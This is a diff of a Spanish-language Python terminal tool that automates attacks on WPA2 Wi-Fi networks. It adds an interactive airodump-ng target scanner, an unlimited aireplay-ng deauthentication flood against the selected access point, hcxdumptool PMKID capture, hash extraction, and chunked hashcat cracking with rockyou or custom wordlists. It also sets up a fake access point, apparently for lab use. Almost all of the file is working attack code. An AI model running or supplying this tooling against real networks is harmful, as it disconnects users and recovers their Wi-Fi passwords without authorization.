@@ -7,14 +7,28 @@ from __future__ import annotations
 import csv, logging, re, shutil, subprocess, sys, tempfile, time
 from pathlib import Path
 from typing import List, Optional, Tuple
+from itertools import islice
+import tempfile
+import subprocess
+from prompt_toolkit import prompt
+from prompt_toolkit.completion import PathCompleter
+from pathlib import Path
+from rich.progress import (Progress, SpinnerColumn, BarColumn,
+                           TaskProgressColumn, TimeRemainingColumn)
 
-
+from rich.progress import Progress, SpinnerColumn, TextColumn
+import curses, threading
 import typer, yaml
 from rich import box
 from rich.console import Console, Group
 from rich.panel import Panel
 from rich.table import Table
 from rich.align import Align      # ← AÑADE ESTA LÍNEA
+from rich.live import Live
+from rich.text import Text
+from datetime import datetime, timedelta
+import re, subprocess, shlex, tempfile, signal, textwrap
+
 # ---------------------------------------------------------------------------------
 # 🔧 ─ Config & Logging
 # ---------------------------------------------------------------------------------
@@ -126,7 +140,7 @@ def act_ap():
     subprocess.run(["sudo","killall","dnsmasq"], check=False)
     hapd = tempfile.NamedTemporaryFile("w", delete=False)
     hapd.write(f"interface={iface}\nssid=WPA2_LAB_FAKE\nchannel=6\nhw_mode=g\nwpa=2\n"
-               "wpa_passphrase=Demo12345\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"); hapd.close()
+               "wpa_passphrase=12345678\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"); hapd.close()
     dns = tempfile.NamedTemporaryFile("w", delete=False)
     dns.write(f"interface={iface}\ndhcp-range=10.0.0.10,10.0.0.50,12h\n"); dns.close()
     run(["hostapd","-B",hapd.name], sudo=True, quiet=True)
@@ -134,134 +148,530 @@ def act_ap():
     console.print(f"[green bold]✓ AP activo en {iface}[/]")
 
 
-def act_scan(duration=6):
-    ensure("airodump-ng")
+# ── ESCÁNER EN TIEMPO REAL ────────────────────────────
+# ──────────────────────────────────────────────────────────────
+#  _live_scan  –  versión ligera (sin CLIENTS ni VENDOR)
+# ──────────────────────────────────────────────────────────────
+def _live_scan(stdscr, mon_iface: str):
+    """
+    Muestra los AP detectados y permite elegir uno con ↑/↓/Enter.
+    Devuelve (bssid, essid, channel, pwr) o None.
+    """
+    import csv, re, subprocess, tempfile, threading, time
+    from pathlib import Path
+
+    # ── configuración curses ──────────────────────────────────
+    curses.curs_set(0)
+    stdscr.keypad(True)
+    stdscr.timeout(120)
+
+    if curses.has_colors():
+        curses.start_color()
+        curses.use_default_colors()
+        curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)   # fila sel.
+        curses.init_pair(2, curses.COLOR_CYAN,   -1)                 # cabecera
+        curses.init_pair(3, curses.COLOR_GREEN,  -1)                 # WPA2
+        curses.init_pair(4, curses.COLOR_YELLOW, -1)                 # WPA/WPS
+        curses.init_pair(5, curses.COLOR_RED,    -1)                 # OPEN
+    sel_style = curses.color_pair(1)
+    hdr_style = curses.color_pair(2) | curses.A_BOLD
+    enc_style = {'WPA2': 3, 'WPA': 4, 'OPEN': 5}
+
+    # ── lanza airodump-ng ─────────────────────────────────────
+    tmp  = tempfile.NamedTemporaryFile(suffix='.csv', delete=False)
+    proc = subprocess.Popen(
+        ['sudo', 'airodump-ng', '--write-interval', '1',
+         '--output-format', 'csv', '-w', tmp.name[:-4], mon_iface],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    csv_path = Path(tmp.name[:-4] + '-01.csv')
+
+    # ── estado compartido ─────────────────────────────────────
+    nets: list[tuple] = []   # [(bssid, essid, ch, pwr, enc)]
+    selected = 0
+
+    # ── lector en hilo aparte ─────────────────────────────────
+    def reader():
+        nonlocal nets
+        while proc.poll() is None:
+            if not csv_path.exists():
+                time.sleep(0.8)
+                continue
+            with csv_path.open(errors='ignore') as fh:
+                rows = list(csv.reader(fh))
+
+            # separa la sección de APs (antes de “Station MAC”)
+            try:
+                idx_station = next(i for i, r in enumerate(rows)
+                                   if r and r[0].startswith('Station MAC'))
+            except StopIteration:
+                idx_station = len(rows)
+            aps_raw = rows[:idx_station]
+
+            new = []
+            for r in aps_raw:
+                if not r or not re.fullmatch(r'([0-9A-F]{2}:){5}[0-9A-F]{2}', r[0]):
+                    continue
+
+                bssid = r[0].strip().upper()
+
+                chan_raw = r[3].strip() if len(r) > 3 else ''
+                m = re.search(r'\d+', chan_raw)
+                ch = int(m.group()) if m else 0
+
+                enc = (r[5] if len(r) > 5 else 'OPEN').strip() or 'OPEN'
+
+                pwr_raw = r[8].strip() if len(r) > 8 else ''
+                try:
+                    power = int(float(pwr_raw))
+                except ValueError:
+                    power = -100
+                pwr = max(0, min(100, 2 * (power + 100)))   # 0-100 %
+
+                essid = (r[13].strip() if len(r) > 13 else '') or '<Hidden>'
+
+                new.append((bssid, essid, ch, pwr, enc))
+
+            nets = new                    # ¡sin ordenar!
+            time.sleep(1)
+
+    threading.Thread(target=reader, daemon=True).start()
+
+    # ── tabla ────────────────────────────────────────────────
+    COLS = [
+        ('ESSID', 35),
+        ('BSSID', 17),
+        ('CH',     4),
+        ('PWR',    4),
+        ('ENCR',   8),
+    ]
+    BORDER_H = '─'
+
+    # ── bucle principal ──────────────────────────────────────
+    while True:
+        stdscr.erase()
+        stdscr.addstr(0, 0,
+            "Options: [Esc] Quit   [↑/k] Up   [↓/j] Down   [Enter] Select")
+
+        tbl_w = sum(w for _, w in COLS) + len(COLS) + 1
+        off_x = max(0, (curses.COLS - tbl_w - 2)//2)
+
+        stdscr.addstr(1, off_x,
+            '┌' + '┬'.join(BORDER_H * w for _, w in COLS) + '┐')
+        x = off_x + 1
+        for title, width in COLS:
+            stdscr.addstr(2, x, f'{title:^{width}}', hdr_style)
+            x += width + 1
+        stdscr.addstr(3, off_x,
+            '├' + '┼'.join(BORDER_H * w for _, w in COLS) + '┤')
+
+        max_rows = curses.LINES - 6
+        for idx, (b, e, ch, pwr, enc) in enumerate(nets[:max_rows]):
+            y  = 4 + idx
+            st = sel_style if idx == selected else curses.A_NORMAL
+            en_st = st
+            base_enc = enc.split('/')[0]
+            if idx != selected and enc_style.get(base_enc):
+                en_st |= curses.color_pair(enc_style[base_enc])
+
+            row = [
+                f'{e:<{COLS[0][1]}.{COLS[0][1]}}',
+                b,
+                f'{ch:^{COLS[2][1]}}',
+                f'{pwr:>3}%',
+                f'{enc:<{COLS[4][1]}}',
+            ]
+            x = off_x + 1
+            for i, cell in enumerate(row):
+                style = en_st if i == 4 else st
+                stdscr.addstr(y, x, cell, style)
+                x += COLS[i][1] + 1
+
+        stdscr.addstr(4 + min(len(nets), max_rows), off_x,
+            '└' + '┴'.join(BORDER_H * w for _, w in COLS) + '┘')
+        stdscr.refresh()
+
+        key = stdscr.getch()
+        if key in (curses.KEY_UP, ord('k')) and selected > 0:
+            selected -= 1
+        elif key in (curses.KEY_DOWN, ord('j')) and selected < len(nets) - 1:
+            selected += 1
+        elif key in (10, 13, curses.KEY_ENTER):
+            proc.terminate()
+            return nets[selected][:4] if nets else None
+        elif key in (27, ord('q')):
+            proc.terminate()
+            return None
+        elif key == curses.KEY_MOUSE:
+            _, _mx, my, _mz, _ = curses.getmouse()
+            idx = my - 4
+            if 0 <= idx < len(nets):
+                proc.terminate()
+                return nets[idx][:4]
+
+
+# ── REEMPLAZA act_scan() POR ESTO ─────────────────────
+def act_scan():
     if not STATE["mon"]:
         console.print("[red]Activa antes el modo monitor[/]")
         return
+    try:
+        res = curses.wrapper(_live_scan, STATE["mon"])
+        if res:
+            b, e, ch, _ = res
+            STATE["target"] = {"bssid": b, "essid": e, "channel": ch}
+            console.print(f"[green]✓ Objetivo seleccionado:[/] {b}  ({e})")
+        else:
+            console.print("[yellow]· Escaneo cancelado ·[/]")
+    except Exception as err:
+        console.print(f"[red]Error en escaneo interactivo:[/] {err}")
 
-    tmp = tempfile.NamedTemporaryFile(suffix=".csv", delete=False)
-    p = subprocess.Popen(
-        ["sudo", "airodump-ng", "--write-interval", "1", "--output-format", "csv",
-         "-w", tmp.name[:-4], STATE["mon"]],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    console.print(f"[cyan]Escaneando {duration}s…[/]")
-    time.sleep(duration)
-    p.terminate()
+def act_deauth():
+    """
+    Flood de deauth en el canal del objetivo.
+    - Cambia la interfaz monitor al canal correcto.
+    - Ctrl-C interrumpe sin mostrar “error –2”.
+    """
+    ensure("aireplay-ng", "aircrack-ng")
 
-    csvf = Path(tmp.name[:-4] + "-01.csv")
-    nets = []
-    with csvf.open(errors="ignore") as fh:
-        rdr = csv.reader(fh)
-        started = False
-        for r in rdr:
-            if not r:
-                continue
-            if r[0].startswith("BSSID"):
-                started = True
-                continue
-            if started and len(r) > 13 and re.match(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", r[0]):
-                nets.append((r[0].strip(), r[13].strip() or "<Hidden>", int(r[3]), r[5]))
-
-    if not nets:
-        console.print("[yellow]No se detectaron APs[/]")
+    tgt, mon = STATE["target"], STATE["mon"]
+    if not (tgt and mon):
+        console.print("[red]Falta monitor o no hay objetivo fijado (escanea primero)[/]")
         return
 
-    inner = Table(
-        show_header=True,
-        box=None,
-        pad_edge=True,
-        collapse_padding=False,
-    )
+    ch     = str(tgt["channel"])
+    bssid  = tgt["bssid"]
 
-    inner.add_column("idx", justify="right", style="bold magenta", width=3, no_wrap=True)
-    inner.add_column("BSSID", style="cyan", width=17, no_wrap=True)
-    inner.add_column("ESSID", style="white", width=22, no_wrap=True)
-    inner.add_column("CH", justify="center", width=3, no_wrap=True)
-    inner.add_column("ENC", justify="center", width=6, no_wrap=True)
+    # Sintonizar canal
+    try:
+        run(["iw", "dev", mon, "set", "channel", ch], sudo=True, quiet=True)
+    except subprocess.CalledProcessError:
+        console.print(f"[red]No pude cambiar {mon} al canal {ch}[/]")
+        return
 
-    for i, (b, e, ch, enc) in enumerate(nets):
-        inner.add_row(str(i), b, e, str(ch), enc)
-
-    panel = Panel(
-        inner,
-        title="APs detectados",
-        title_align="center",
-        box=box.SQUARE,
-        padding=(0, 1)
-    )
-
-    console.print(panel)
+    console.print(f"[cyan]Inyectando deauth en canal {ch}…  (Ctrl-C para parar)[/]")
 
     try:
-        idx = int(console.input("Target nº >> ") or 0)
-        b, e, ch, _ = nets[idx]
-        STATE["target"] = {"bssid": b, "essid": e, "channel": ch}
-        console.print(f"[green]✓ Objetivo seleccionado:[/] {b}")
-    except (IndexError, ValueError):
-        console.print("[red]Índice no válido.[/]")
-
-
-def act_deauth():
-    ensure("aireplay-ng","aircrack-ng")
-    if not (STATE["mon"] and STATE["target"]):
-        console.print("[red]Falta monitor o target[/]"); return
-    run(["aireplay-ng","--deauth","0",
-         "-a",STATE["target"]["bssid"], STATE["mon"]], sudo=True)
-
-def act_deauth():
-    ensure("aireplay-ng","aircrack-ng")
-    tgt = STATE["target"]; mon = STATE["mon"]
-    if not (tgt and mon): console.print("[red]Falta monitor o target[/]"); return
-    run(["aireplay-ng","--deauth","0","-a",tgt["bssid"],mon], sudo=True)
-
-def act_capture():
-    ensure("hcxdumptool")
-    mon = STATE["mon"]
-    if not mon: console.print("[red]No hay monitor[/]"); return
-    if STATE["target"]:
-        bssid, ch = STATE["target"]["bssid"], str(STATE["target"]["channel"])
-    else:
-        bssid = console.input("BSSID >> ").strip().upper()
-        ch = console.input("Canal >> ").strip()
-    console.print(f"[cyan]Capturando PMKID… Ctrl-C para parar[/]")
-    try:
-        run(["hcxdumptool","-i",mon,"-c",ch,"-t",bssid,"-o",str(PCAP_FILE)],
-            sudo=True, quiet=True)
+        run(["aireplay-ng", "--deauth", "0", "-a", bssid, mon], sudo=True)
     except KeyboardInterrupt:
-        pass
-    STATE["hash"] = str(PCAP_FILE)
-    console.print(f"[green bold]✓[/] PCAP guardado → {PCAP_FILE}")
+        console.print("[yellow]· Deauth interrumpido ·[/]")
+    except subprocess.CalledProcessError as e:
+        if e.returncode == -2:          # −2 = interrumpido por SIGINT
+            console.print("[yellow]· Deauth interrumpido ·[/]")
+        else:
+            console.print(f"[red]aireplay-ng terminó con error:[/] {e.returncode}")
+
+# ── Captura PMKID (filtrado con BPF por BSSID) ─────────────────────────────────
+def act_capture():
+    """
+    Captura PMKID/EAPOL de TODO lo que se oiga en el canal del target.
+    Ideal cuando el driver no admite filtros en hcxdumptool 6.3.x.
+    """
+    ensure("hcxdumptool")
+    mon = STATE.get("mon")
+    if not mon:
+        console.print("[red]No hay interfaz en modo monitor[/]")
+        return
+
+    # ── Desactiva NM y wpa_supplicant ───────────────────────
+    for svc in ("NetworkManager", "wpa_supplicant"):
+        subprocess.run(["sudo", "systemctl", "stop", svc], check=False)
+
+    # ── Canal del objetivo (opcional pero recomendable) ─────
+    tgt = STATE.get("target", {})
+    ch = str(tgt.get("channel", "")) if tgt else ""
+    if ch:
+        run(["iw","dev",mon,"set","channel", ch], sudo=True, quiet=True)
+        console.print(f"[cyan]Sintonizado {mon} al canal {ch}[/]")
+
+    # ── Archivo de salida ──────────────────────────────────
+    cap_dir = PROJECTROOT / "captures"; cap_dir.mkdir(exist_ok=True)
+    pcap = cap_dir / f"dump-{time.strftime('%Y%m%d_%H%M%S')}.pcapng"
+    console.print(f"[cyan]Capturando PMKID… Ctrl-C para parar → {pcap}[/]")
+
+    try:
+        run(["hcxdumptool", "-i", mon, "-t", "5", "-w", str(pcap)], sudo=True)
+    except KeyboardInterrupt:
+        console.print("[yellow]· Captura interrumpida ·[/]")
+    except subprocess.CalledProcessError as e:
+        console.print(f"[red]hcxdumptool terminó con código {e.returncode}[/]")
+        return
+
+    # ── Verificación ───────────────────────────────────────
+    if not pcap.exists() or pcap.stat().st_size < 100:
+        console.print("[yellow]No se capturaron paquetes útiles.[/]")
+        if pcap.exists():
+            pcap.unlink()
+        return
+
+    STATE["pcap"] = str(pcap)
+    console.print(f"[green bold]✓[/] Captura guardada en {pcap}\n"
+                  f"[dim]Filtra luego con hcxpcapngtool --filterlist_ap={tgt.get('bssid','<MAC>')}[/]")
+
+# ────────────────────────── EXTRAER HASH ──────────────────────
+from rich.table import Table
+from rich.panel import Panel
+from rich.progress import Progress, SpinnerColumn, TextColumn
 
 def act_extract():
-    ensure("hcxpcapngtool","hcxtools")
-    run(["hcxpcapngtool","-o",str(HASH_FILE), str(PCAP_FILE)], quiet=True)
-    STATE["hash"] = str(HASH_FILE)
-    console.print(f"[green bold]✓ Hash 22000 → {HASH_FILE}")
+    """
+    Extrae y muestra un resumen legible del hash 22000 de un PCAP:
+     - Si no hay STATE['pcap'], lista captures/ y deja elegir.
+     - Luego corre hcxpcapngtool, parsea su salida y la muestra en tabla.
+    """
+    ensure("hcxpcapngtool", "hcxtools")
 
+    # 1) Si no tenemos pcap en el estado, listamos y permitimos elegir
+    pcap_path = STATE.get("pcap")
+    if not pcap_path:
+        cap_dir = PROJECTROOT / "captures"
+        caps = sorted(cap_dir.glob("*.pcapng"))
+        if not caps:
+            console.print("[red]No hay capturas en captures/. Ejecuta antes la opción 6[/]")
+            return
+
+        table = Table("Índice", "Archivo", "Tamaño (KiB)", box=box.SIMPLE)
+        for i, f in enumerate(caps):
+            table.add_row(str(i), f.name, str(f.stat().st_size // 1024))
+        console.print(Panel(table, title="Capturas disponibles"))
+
+        choice = console.input("[bold]Selecciona índice (q para salir): [/]").strip()
+        if choice.lower() == "q":
+            console.print("[yellow]Extracción cancelada[/]")
+            return
+        try:
+            idx = int(choice)
+            pcap_path = str(caps[idx])
+        except:
+            console.print("[red]Índice no válido[/]"); return
+
+    # 2) Ejecutamos hcxpcapngtool con spinner
+    console.print(Panel.fit(f"[bold]Extrayendo hash 22000 de[/bold] {Path(pcap_path).name}", style="cyan"))
+    cmd = ["hcxpcapngtool", "-o", str(PROJECTROOT/"hashes"/"tmp.22000"), pcap_path]
+
+    with Progress(SpinnerColumn(), TextColumn("{task.description}"), transient=True, console=console) as prog:
+        prog.add_task("Procesando...", start=True)
+        try:
+            output = subprocess.check_output(cmd, text=True)
+        except subprocess.CalledProcessError as e:
+            console.print(f"[red]Error: hcxpcapngtool terminó con código {e.returncode}[/]")
+            return
+
+    # 3) Parseo de los campos clave
+    fields = {
+        "file name": "Archivo",
+        "duration of the dump tool (seconds)": "Duración (s)",
+        "packets inside": "Paquetes totales",
+        "EAPOL messages (total)": "EAPOL mensajes",
+        "RSN PMKID (total)": "PMKID totales",
+        "RSN PMKID written to 22000 hash file": "PMKID hashes"
+    }
+    stats = {}
+    for line in output.splitlines():
+        line = line.strip()
+        for key, label in fields.items():
+            if line.startswith(key):
+                # valor tras los ':' caract.
+                val = line.split(":", 1)[1].strip()
+                stats[label] = val
+
+    # 4) Mostrar resumen en tabla
+    summary = Table(box=box.SIMPLE, title="📋 Resumen de hash extraction")
+    summary.add_column("Campo", style="bold")
+    summary.add_column("Valor", justify="right")
+
+    summary.add_row("PCAP", Path(pcap_path).name)
+    for label in ("Duración (s)", "Paquetes totales", "EAPOL mensajes", "PMKID totales", "PMKID hashes"):
+        if label in stats:
+            summary.add_row(label, stats[label])
+
+    console.print(summary)
+
+    # 5) Mover el hash extraído a hashes/ y actualizar estado
+    ts = time.strftime("%Y%m%d_%H%M%S")
+    dest = PROJECTROOT/"hashes"/f"hash-{ts}.22000"
+    (PROJECTROOT/"hashes").mkdir(exist_ok=True)
+    shutil.move(str(PROJECTROOT/"hashes"/"tmp.22000"), str(dest))
+
+    STATE["hash"] = dest
+    console.print(f"[green bold]✓[/] Hash 22000 → {dest.name}")
+
+
+# ────────────────────────── CRACKEAR HASH ─────────────────────
 def act_crack():
+    """
+    Crack WPA2 con hashcat en modo AUTOMÁTICO o INTERACTIVO
+    ─────────────────────────────────────────────────────────
+    • Si no hay STATE['hash'], lista los hashes en hashes/ y deja elegir.
+    • Elige rockyou.txt, dnsmap.txt, o importa tu propia lista (con autocompletar).
+    • Modo Automático  : lee TODA la word-list, muestra barra de progreso y tabla viva.
+    • Modo Interactivo : procesa por bloques; pregunta tras cada bloque y muestra paneles
+                         “Bloque X” y “✓ Hallados bloque X”.
+    • Tabla → 2 columnas (SSID | Contraseña). Contraseña en rojo y negrita.
+    • Al final solo: “✅ Crack completado”.
+    """
     ensure("hashcat")
-    rock = "/usr/share/wordlists/rockyou.txt"
-    run(["hashcat","-m","22000",str(HASH_FILE), rock], quiet=True)
-    out = subprocess.check_output(["hashcat","-m","22000","--show",str(HASH_FILE)], text=True)
-    if out.strip():
-        pw = out.split(":",1)[1].strip()
-        STATE["pw"] = pw
-        console.print(f"[green bold]✓ Contraseña encontrada:[/] {pw}")
+
+    # ╭─ 0) Hash a crackear ──────────────────────────────────────────────╮
+    hashf = STATE.get("hash")
+    if not hashf:
+        hdir   = PROJECTROOT / "hashes"
+        hashes = sorted(hdir.glob("hash-*.22000"))
+        if not hashes:
+            console.print("[red]No hay hashes en hashes/. Usa opción 7 primero.[/]")
+            return
+        tbl = Table("Índice", "Hash", box=box.SIMPLE)
+        for i, f in enumerate(hashes):
+            tbl.add_row(str(i), f.name)
+        console.print(Panel(tbl, title="Hashes disponibles"))
+        sel = console.input("[bold]Índice (q para salir):[/] ").strip()
+        if sel.lower() == "q":
+            return
+        try:
+            hashf = str(hashes[int(sel)])
+        except Exception:
+            console.print("[red]Índice inválido.[/]")
+            return
+
+    # ╭─ 1) Word-list ────────────────────────────────────────────────────╮
+    wl_dir = Path("/usr/share/wordlists")
+    base_wls = ["rockyou.txt", "dnsmap.txt"]
+    wls = [wl_dir / n for n in base_wls if (wl_dir / n).exists()]
+    tbl = Table("Índice", "Word-list", box=box.SIMPLE)
+    for i, w in enumerate(wls):
+        tbl.add_row(str(i), w.name)
+    tbl.add_row("[green]i[/green]", "[magenta]Importar otra…[/magenta]")
+    console.print(Panel(tbl, title="Word-lists"))
+    wl_choice = console.input("[bold]Elige índice o 'i':[/] ").strip().lower()
+    if wl_choice == "i":
+        wl_path = Path(prompt("Ruta word-list: ", completer=PathCompleter()))
     else:
-        console.print("[yellow]No crackeada (usa otra WL)[/]")
+        try:
+            wl_path = wls[int(wl_choice)]
+        except Exception:
+            console.print("[red]Índice inválido – uso rockyou.txt[/]")
+            wl_path = wl_dir / "rockyou.txt"
+    if not wl_path.exists():
+        console.print(f"[red]Word-list inexistente:[/] {wl_path}")
+        return
+
+    # ╭─ 2) Modo ─────────────────────────────────────────────────────────╮
+    auto = console.input("¿Modo automático? ([y]/n) ").strip().lower() in ("", "y")
+    default_chunk = 50_000
+    if auto:
+        chunk_size = default_chunk
+    else:
+        blk = console.input(f"Tamaño bloque [Enter={default_chunk}] ").strip()
+        try:
+            chunk_size = int(blk) if blk else default_chunk
+        except ValueError:
+            chunk_size = default_chunk
+
+    # ╭─ 3) Cabecera elegante ────────────────────────────────────────────╮
+    header = Panel.fit(
+        f"📶 Crack WPA2\n"
+        f"Hash: {Path(hashf).name}\n"
+        f"WL: {wl_path.name}  •  Bloque: {chunk_size} líneas  •  "
+        f"{'Automático' if auto else 'Interactivo'}",
+        title="🔑 Iniciando crack",
+        box=box.ROUNDED,
+        style="cyan")
+    console.print(header)
+
+    # ╭─ 4) Tabla de resultados (una sola) ───────────────────────────────╮
+    table = Table("SSID", "Contraseña", box=box.SIMPLE, header_style="bold")
+    found_pw = set()
+
+    # ╭─ 4A) Modo AUTOMÁTICO (barra de progreso y tabla viva) ────────────╮
+    if auto:
+        total_lines = sum(1 for _ in wl_path.open("r", errors="ignore"))
+        progress = Progress(
+            SpinnerColumn(),
+            BarColumn(bar_width=None),
+            TaskProgressColumn(),
+            TimeRemainingColumn(),
+            console=console,
+            transient=True)
+        task = progress.add_task("Crackeando", total=total_lines)
+
+        group = Group(progress, table)
+        with Live(group, console=console, refresh_per_second=2):
+            with wl_path.open("r", errors="ignore") as fh:
+                while True:
+                    chunk = list(islice(fh, chunk_size))
+                    if not chunk:
+                        break
+                    # escribe chunk tmp
+                    tmp = tempfile.NamedTemporaryFile("w+", delete=False)
+                    tmp.write("".join(chunk)); tmp.close()
+                    subprocess.run(
+                        ["hashcat", "-m", "22000", hashf, tmp.name, "--quiet"],
+                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                    )
+                    os_lines = len(chunk)
+                    progress.update(task, advance=os_lines)
+                    # lee passwords
+                    show = subprocess.check_output(
+                        ["hashcat", "-m", "22000", "--show", hashf],
+                        text=True).strip()
+                    for line in show.splitlines():
+                        parts = line.split(":")
+                        if len(parts) >= 4:
+                            ssid, pwd = parts[2], parts[-1]
+                            if pwd not in found_pw:
+                                found_pw.add(pwd)
+                                table.add_row(ssid, f"[bold red]{pwd}[/bold red]")
+
+    # ╭─ 4B) Modo INTERACTIVO ────────────────────────────────────────────╮
+    else:
+        with wl_path.open("r", errors="ignore") as fh:
+            block = 1
+            while True:
+                chunk = list(islice(fh, chunk_size))
+                if not chunk:
+                    break
+                console.print(Panel(f"Bloque {block} → probando {len(chunk)} contraseñas",
+                                    box=box.ROUNDED))
+                tmp = tempfile.NamedTemporaryFile("w+", delete=False)
+                tmp.write("".join(chunk)); tmp.close()
+                subprocess.run(
+                    ["hashcat", "-m", "22000", hashf, tmp.name, "--quiet"],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                show = subprocess.check_output(
+                    ["hashcat", "-m", "22000", "--show", hashf],
+                    text=True).strip()
+                for line in show.splitlines():
+                    parts = line.split(":")
+                    if len(parts) >= 4:
+                        ssid, pwd = parts[2], parts[-1]
+                        if pwd not in found_pw:
+                            found_pw.add(pwd)
+                            table.add_row(ssid, f"[bold red]{pwd}[/bold red]")
+                console.print(Panel(table, title=f"✓ Hallados bloque {block}",
+                                    box=box.ROUNDED))
+                cont = console.input("Continuar con siguiente bloque? ([y]/n) ").strip().lower()
+                if cont and cont != "y":
+                    break
+                block += 1
+
+    # ╭─ 5) Fin ───────────────────────────────────────────────────────────╮
+    console.print(Panel("✅ Crack completado", box=box.ROUNDED, style="green"))
 
 # ── menú ─────────────────────────────────────────────────
 MENU = [
-    ("1","Modo MONITOR",   act_prepare),
-    ("2","Levantar AP",    act_ap),
-    ("3","Reset IFs",      act_reset),
-    ("4","Escanear redes", act_scan),
-    ("5","Deauth attack",  act_deauth),
-    ("6","Capturar PMKID", act_capture),
-    ("7","Extraer hash",   act_extract),
-    ("8","Crack offline",  act_crack),
-    ("0","Salir",          None),
+    ("1", "Modo MONITOR",   act_prepare),
+    ("2", "Levantar AP",    act_ap),
+    ("3", "Reset IFs",      act_reset),
+    ("4", "Escanear redes", act_scan),
+
+    # orden re-numerado
+    ("5", "Capturar PMKID", act_capture),   # ← antes era 6
+    ("6", "Extraer hash",   act_extract),   # ← antes era 7
+    ("7", "Crack offline",  act_crack),     # ← antes era 8
+    ("8", "Deauth attack",  act_deauth),    # ← antes era 5
+
+    ("0", "Salir",          None),
 ]
 
 def show_menu():
